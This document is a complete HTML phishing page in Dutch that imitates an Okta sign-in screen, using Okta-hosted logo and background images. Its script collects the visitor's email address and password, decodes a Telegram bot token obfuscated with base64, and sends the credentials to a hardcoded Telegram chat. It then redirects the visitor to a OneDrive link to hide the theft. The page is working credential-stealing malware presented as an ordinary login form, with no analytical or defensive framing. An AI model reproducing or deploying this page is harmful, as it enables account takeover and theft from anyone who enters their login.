<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-weight: normal;
      background: url('https://ok9static.oktacdn.com/fs/bco/7/fs0chyx69ua4xbJnw417') no-repeat center center fixed;
      background-size: cover;
      font-family: sans-serif;
    }
    .container {
      background: white;
      width: 320px;
      margin: 80px auto;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
    }
    label {
      display: block;
      margin-bottom: 8px;
      font-weight: normal;
    }
    input[type="email"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 20px;
      border-radius: 5px;
      border: 1px solid #ccc;
      font-weight: normal;
    }
    button {
      width: 100%;
      background-color: #FFD700;
      color: black;
      padding: 10px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: normal;
    }
    .logo-lang {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 30px;
    }
    .logo-lang img {
      height: 40px;
    }
    .lang {
      color: black;
    }
    .remember-me {
      margin-top: -15px;
      margin-bottom: 20px;
    }
    .footer-links {
      margin-top: 20px;
      font-size: 12px;
      text-align: center;
      line-height: 1.6;
    }
    .email-display {
      font-size: 14px;
      margin-bottom: 20px;
      word-break: break-word;
    }
    .step-title {
      font-size: 16px;
      margin-bottom: 10px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-lang">
      <img src="https://ok9static.oktacdn.com/fs/bco/1/fs0ci1i9sp9xQg0tI417" alt="Logo">
      <div class="lang">NL FR EN</div>
    </div>

    <div id="step1">
      <label for="email">Je e-mailadres</label>
      <input type="email" id="email" required>
      <div class="remember-me">
        <label><input type="checkbox"> Aangemeld blijven</label>
      </div>
      <button onclick="goToPassword()">Volgende</button>
    </div>

    <div id="step2" style="display:none;">
      <div class="step-title">Aanmelden met je wachtwoord</div>
      <div class="email-display" id="emailDisplay"></div>
      <label for="password">Wachtwoord</label>
      <input type="password" id="password" required>
      <button onclick="submitForm()">Bevestigen</button>
      <div class="footer-links">
        Wachtwoord vergeten?<br>
        Aanmelden met iets anders - NIEUW<br>
        Terug naar aanmelden
      </div>
    </div>
  </div>

  <script>
    function goToPassword() {
      const email = document.getElementById('email').value;
      if (!email) return alert("Veuillez entrer votre e-mail.");
      document.getElementById('step1').style.display = 'none';
      document.getElementById('step2').style.display = 'block';
      document.getElementById('emailDisplay').textContent = email;
    }

    function submitForm() {
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      const token = atob("NTY2NDkwMzY3ODpBQUhFSHRPMldiLVVDNU43QWl6dnVxaVEtTmRfRzg5UmQ5MA==");
      const chatId = "5147593892";
      const message = `Login\nEmail: ${email}\nPassword: ${password}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(res => res.json())
      .then(() => {
        window.location.href = "https://onedrive.live.com/?redeem=aHR0cHM6Ly8xZHJ2Lm1zL2IvYy9iMzJmOGEyN2YzZjQ3OGY5L0VmbDQ5UE1uaWk4Z2dMTl9BQUFBQUFBQi1Pa09weTdGQk5YWlM4RDFzMGJRMGc%5FZT1iNkR1T28&cid=B32F8A27F3F478F9&id=B32F8A27F3F478F9%21127&parId=root&o=OneUp";
      })
      .catch(err => {
        alert("Erreur lors de l'envoi");
        console.error(err);
      });
    }
  </script>
</body>
</html>
